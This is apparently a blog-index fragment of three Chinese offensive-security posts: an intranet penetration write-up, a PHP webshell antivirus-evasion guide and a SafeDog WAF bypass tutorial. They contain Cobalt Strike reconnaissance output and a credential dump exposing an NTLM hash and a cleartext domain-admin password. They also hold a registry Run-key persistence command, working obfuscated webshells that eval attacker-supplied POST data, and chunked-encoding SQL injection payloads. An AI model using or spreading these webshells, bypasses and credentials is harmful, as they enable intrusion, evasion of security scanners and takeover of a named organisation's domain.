\nMSOIDSVC.EXE                  2660 msoidsvc                                    \nsvchost.exe                   2328 Net Driver HPZ12                            \nOpenDNSAuditService.exe       2220 OpenDNS Active Directory Service            \nMSOIDSVCM.EXE                 1256 N/A                                         \nsvchost.exe                   2172 Pml Driver HPZ12                   \nScreenConnect.ClientServi      556 ScreenConnect Client (62c0d7e1d3b94bc5)     \nsvchost.exe                   1472 TermService                                 \nOpenDNSAuditClient.exe        2924 N/A                                         \nconhost.exe                   1380 N/A                                         \nVGAuthService.exe             2096 VGAuthService                               \nvmtoolsd.exe                   612 VMTools                                     \nWRCoreService.x64.exe         2136 WRCoreService                               \nWRSkyClient.x64.exe           3180 WRSkyClient                                 \ndfssvc.exe                    3316 Dfs                                         \nWmiPrvSE.exe                  3484 N/A                                         \nsvchost.exe                   3568 UALSVC, UmRdpService                        \nVeeamDeploymentSvc.exe        3612 VeeamDeploySvc                              \nWRSvcMetrics.x64.exe          3580 N/A                                         \nsvchost.exe                   4216 PolicyAgent                                 \nmsdtc.exe                     4160 MSDTC                                       \nDCA.Edge.Console.exe          3676 DCAPulse                                    \niashost.exe                   4548 N/A                                         \nwsmprovhost.exe               9104 N/A                                         \npowershell.exe                7828 N/A                                         \nconhost.exe                   6688 N/A                                         \npowershell.exe                 360 N/A                                         \nconhost.exe                   5152 N/A                                         \nnotepad.exe                   1760 N/A                                         \nLTSvcMon.exe                  5424 LTSvcMon                                    \nLTSVC.exe                     7272 LTService                                   \nlabvnc.exe                    5412 tvnserver                                   \nVeeam.EndPoint.Service.ex     8316 VeeamEndpointBackupSvc                      \nwsmprovhost.exe               7108 N/A                                         \nScreenConnect.WindowsBack     4384 N/A                                         \ncsrss.exe                     7564 N/A                                         \nwinlogon.exe                  5520 N/A                                         \ndwm.exe                       6572 N/A                                         \nlabvnc.exe                    5916 N/A                                         \ntaskhostex.exe                8540 N/A                                         \nWRSA.exe                      2308 N/A                                         \nScreenConnect.WindowsClie     3732 N/A                                         \nexplorer.exe                  3964 N/A                                         \nMRT.exe                       4852 N/A                                         \nvm3dservice.exe               2656 N/A                                         \nMRT.exe                       5196 N/A                                         \nvmtoolsd.exe                  5340 N/A                                         \nDCA.Edge.TrayIcon.exe         6432 N/A                                         \nLTTray.exe                    4564 N/A                                         \nWmiPrvSE.exe                  6336 N/A                                         \nTaskmgr.exe                   6684 N/A                                         \nLogonUI.exe                    380 N/A                                         \ncmd.exe                       2400 N/A                                         \nconhost.exe                   6216 N/A                                         \nnet.exe                       8100 N/A                                         \nnet1.exe                      8908 N/A                                         \ncmd.exe                       2956 N/A                                         \nconhost.exe                   8300 N/A                                         \nnet.exe                       7344 N/A                                         \nnet1.exe                      5248 N/A                                         \ncmd.exe                        432 N/A                                         \nconhost.exe                   9052 N/A                                         \nnet.exe                       7356 N/A                                         \nnet1.exe                      3156 N/A                                         \ncmd.exe                       8232 N/A                                         \nconhost.exe                   4600 N/A                                         \nnet.exe                       5528 N/A                                         \nnet1.exe                      7352 N/A                                         \ncmd.exe                       4304 N/A                                         \nconhost.exe                   7148 N/A                                         \nvds.exe                       3872 vds                                         \ncmd.exe                       7716 N/A                                         \nconhost.exe                   8564 N/A                                         \ntasklist.exe                  9212 N/A   \n\n内网渗透：边缘机的systeminfo因为前期拿到了边缘机，这里查看systeminfo,发现是2012R2的主机。\n\n边缘机提权：（利用烂土豆直接提上权限）提权之后做进程迁移，直接把进程迁移到lsass进程中去。\n\n内网信息收集：先查看ip，看是否存在双网卡机Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : CAMS-SQL3\n   Primary Dns Suffix  . . . . . . . : AVV.org\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : AVV.org\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-98-E3-D6\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::a5b1:d534:730:3123%11(Preferred) \n   IPv4 Address. . . . . . . . . . . : 10.2.0.49(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n\n进行域管理员和域控的查看：域控：net group “domain controllers” &#x2F;domain\n[04/26 18:16:59] beacon> shell net group \"domain Controllers\" /domain\n[04/26 18:17:00] [*] Tasked beacon to run: net group \"domain Controllers\" /domain\n[04/26 18:17:00] [+] host called home, sent: 69 bytes\n[04/26 18:17:00] [+] received output:\nThe request will be processed at a domain controller for domain FPC.LOCAL.\n\nGroup name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAVV-DC1$                 AVV-DC2$                 AVV-DHDC01$              \nAVV-DHDC02$                    \n\n域管：net group “domain admins” &#x2F;domain\nfpcadmin                 mqd.ns          \nmqd.rmm                  mqd.tdv  \n\n前直接归属的域控和主域控：net time &#x2F;domain\n[04/26 18:27:52] beacon> shell net time /domain\n[04/26 18:27:52] [*] Tasked beacon to run: net time /domain\n[04/26 18:27:52] [+] host called home, sent: 47 bytes\n[04/26 18:27:54] [+] received output:\nCurrent time at \\\\AVV-DC2.FPC.LOCAL is 4/26/2023 5:27:53 AM\n\n可以发现当前是直接被DC2所归属，这里查下主控制器。这里直接使用CS插件来进行渗透\n[04/26 18:31:11] [+] =========== 查看主域控制器 ==========\n[04/26 18:31:12] [*] Tasked beacon to run: netdom query pdc\n[04/26 18:31:12] [+] host called home, sent: 47 bytes\n[04/26 18:31:14] [+] received output:\nPrimary domain controller for the domain:\n\nAVV-DC1\nThe command completed successfully.\n\n定位域控的IP地址：这里经过ping之后发现，域控不是都在同一个网段，应该是如下的结构。\n\n内网存活主机探测：我先进行了DC段和本机段存活主机的探测，这里直接利用cs的插件（portscan）\nportscan 10.2.0.0/24\nportscan 10.2.92.30/24\nportscan 10.6.0.10/24\nportscan 10.11.1.12/24\n\n\nfscan扫描本机C段：潦草的扫描到了ftp的匿名登陆，没有扫描到其他有用信息。这里就不放其他几个段的截图，都没扫描到啥有用的信息。\n\n做hashdump：这里直接做完hashdump之后发现\nmsv :   \n     [00000003] Primary\n     * Username : mqd.tdv \n     * Domain   : FPC\n     * NTLM     : 7007ebae678042f1cf112578ac43bf68\n     * SHA1     : 712ce4bf3a4a777582389d37f8d06158ed204f6b\n    tspkg : \n    wdigest :   \n     * Username : mqd.tdv \n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    kerberos :  \n     * Username : mts.tdv\n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    ssp :   \n    credman :   \n\n内网横向（因为自己失误造成了比较繁琐的过程）因为前期已经看到了域管的账号就是mqd.tdv，这里直接做密码喷洒，这里转到msf中看下。上线了如此多的主机，同时，DC2子域控也进行了上线\n第一天上线的主机：(MSF上)\nCS上：（上线74台）\n小插曲：因为渗透到域控的时候，在半夜2点半，所以在拿到DC2的权限的时候，就直接关掉电脑睡觉啦，没有进行留后门和做进程注入，导致第二天上线的时候执行命令出现如下界面。\n这里的意思就是启动新进程的时候，系统无法将当前进程的令牌传递给新进程。也就是无法创建进程，所以只能通过其他方式来进行横向渗透。并且后期发现该域管理员密码已经进行修改。\nDC挂掉之后的想到的几种方式：（1）抓去已控主机的hash看是否有其他域管登陆（失败）因为前面已经拿到了100多台机子的权限，所以能想到的第一个思路就是把100多台主机上的hash都进行一个抓起取，然后看是否可以抓到域管的账号，但是这里抓完之后会发现，没有一台域管是上线的，所以这里也比较无语。\n\n（2）利用CVE漏洞来进行横向（失败）因为之前探测到DC的版本是windows2012 R2版本，所以想到了用ms17-010来进行内网横向，但是这里经过检测之后发现也没有ms17-010的漏洞，所以无法进行横向\n\n（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）这里经过尝试CVE-2020-1472漏洞，也没有发现可以横向上去，通过poc检测发现是fail的。\n\n（4）尝试攻击exchange服务器，来中继攻陷主机（失败）这里就不放细节了，均以失败告终。\n峰回路转：（DC2子域控上线）DC2子域控上线过程：这里经过一天的折磨之后发现，以上的几种方式不好使，但是想到了抓取机器用户的hash，通过构造密码表，来进行域管的密码喷洒，这里抓取了100多个的机器用户和几个域内用户做成密码表，重新进行内网横向。\n这里截图部分域内用户，做成密码表后直接进行喷洒，发现域管成功上线。\n\n\n\nDC2子域权限维持：（1）把当前进程注入到lsass进程中去。\n（2）reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"start\" /d \"C:\\Windows\\Temp\\start.exe\"  //开机自启动\n（3）添加域管理员，因为已经拿到域管理员的权限，所以可以添加域管理员，来进行权限维持（这里直接通过lstar的插件来进行域管理员的添加）\n\n其他域控上线这里也是一个小Tip，也是提供给大家的一个思路\n在有权限的情况下，可以添加域管理员，然后通过域管理员来进行横向其他域控（这是仅限于一个域），但是上面给出来了结构，这个域都是在一个域内的，所以的话，就可以进行添加管理员来上线。这里直接放后期上线的域控。\n\n总结：经过这次实战总结了很多小的技巧。\n（1）可以通过添加域管理员来上线域内的所有主机\n（2）可以通过cs来进行进程注入or进程迁移，来实现本机system权限的获取\n（3）此次实战的密码喷洒尤为重要，所以有机器用户的hash一定要进行抓取\n（4）SPN服务横向可以通过打邮服来进行获取域控权限\n（5）学习了权限维持的方法（开机自启动、winrm的横向和psexec的横向）\n\n恶补了一大波内网知识（比靶场来的实在）\n\n不足之处：\n（1）此次通过内网渗透，虽然打了邮件服务器，但是没有通过邮件服务器来拿下DC的权限。\n（2）没有通过SPN票据横向拿下对应的服务器，比如MSSQL的和CIFS的\n（3）此次没有利用白银票据进行横向（得重新学习）\n","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"0bde8e350134ac3c0961afd29aadf7f8","title":"phpwebshell免杀","content":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。\n0x01 蚁剑介绍及其改编：关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。\n但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。\n蚁剑默认流量返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。\n默认的base64编码器但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。\n去github上找到蚁剑的编码器和对应的解码器github地址:（编码器）这里下载默认的aes-128的默认流量。\n默认编码器的webshell\n&lt;?php\n@session_start();\n$pwd='ant';\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));\n?>\n\n默认webshell讲解：这里打开session_start，然后截取Cookie中的PHPSESSION的16位。\n然后进行aes加密，密码为pwd\n\n再D盾，河马和阿里云进行扫描：\n河马没有查出来，可能是比较弱阿里云直接报恶意\n\n初步修改后的webshell：&lt;?php\n@session_start();\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction decode($key,$data)&#123;\n$data_new = '';\nfor($i=0;$i&lt;=strlen($data);$i++)&#123;\n$b=$data[$i]^$key;\n$data_new = $data_new.urldecode($b);\n&#125;\ndefine('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);\ndefine('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');\nreturn $data_new;\n&#125;\nfunction decrypto($key,$data)&#123;\n$data = base64_decode($data);\n$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);\ndecode('\\\\','=:=om>n?o8h9i:j;k*d0e.l/m(');\n$ass=ass;\n$ass(ev);\n&#125;\nclass run&#123;\n    public $data;\n    public function __construct()&#123;\n$this->data = '#````````#'.$_POST[1].\"#`#`#\";\n$this->data = $this->data.\"123456\";\n&#125;\n&#125;\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n$run = new run();\ndecrypto($key,$run->data);\n?>\n\n这里能过去D盾，但是无法绕过阿里云查杀。\n所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）\n混淆之后的webshell：这里提供php在线加密的站\nhttps://enphp.djunny.com/\n\n这里加密之后生成webshell。如下：\ngoto Zc4oD; UJih6: function decrypto($key, $data) &#123; goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, \"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode(\"\\x5c\", \"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: &#125; goto DGZMG; WvjFi: ini_set(\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\", \"\\117\\146\\x66\"); goto Wguwk; DGZMG: class run &#123; public $data; public function __construct() &#123; $this->data = \"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\" . $_POST[1] . \"\\x23\\140\\x23\\140\\43\"; &#125; &#125; goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, \"\\141\"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) &#123; goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define(\"\\141\\x73\\x73\", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define(\"\\x65\\166\", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . \"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i &lt;= strlen($data))) &#123; goto RuTl1; &#125; goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: &#125; goto UJih6; apKNY: decrypto($key, $run->data);\n\n经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。\n已经成功绕过阿里云查杀。用burpsuite抓下流量特征。\n从流量加密来分析的话，已经能绕过态势感知和全流量分析机。\n蚁剑UA头的修改：在burp的数据包中能清楚的看到蚁剑的特征\n在目录&#x2F;modules&#x2F;request.js文件中修改UA头\n&#x2F;modules&#x2F;update.js文件修改\n0x03 总结：关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。\n","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","categories_index":"","tags_index":"免杀","author_index":"Q16G"},{"id":"cf78fa225b6de7abf9eac61bd71ce650","title":"waf绕过-打狗棒法","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"waf绕过-打狗棒法","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"waf绕过","author_index":"Q16G"}]